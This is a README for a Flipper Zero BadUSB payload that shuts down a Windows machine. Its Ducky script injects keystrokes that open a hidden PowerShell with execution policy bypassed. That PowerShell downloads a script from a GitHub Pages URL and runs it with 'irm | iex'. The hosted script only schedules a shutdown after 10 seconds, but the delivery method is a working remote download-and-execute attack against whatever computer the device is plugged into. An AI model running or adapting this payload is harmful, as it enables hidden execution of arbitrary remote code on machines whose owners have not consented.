# Shutdown (Windows)

**Version:** 1.0  
**Author:** I am TBJr  
**Platform:** Windows 10 / 11  
**Delivery:** Flipper Zero HID (`irm | iex`)

---

## What it does

Downloads and runs the hosted shutdown script, which schedules a Windows shutdown after a 10-second delay.

---

## Setup

1. Host `host/Shutdown.ps1` on GitHub Pages (or your own server)
2. Update the URL in `Shutdown.txt` if you changed the host

## Ducky script

```
GUI r
DELAY 500
STRING powershell.exe -w h -NoP -NonI -Ep Bypass -c "irm https://tbjr.github.io/Flipper-payloads/host/Shutdown.ps1 | iex"
ENTER
```

## Host script

```
shutdown.exe /s /t 10
```

## Credits

Written by **TBJr**.
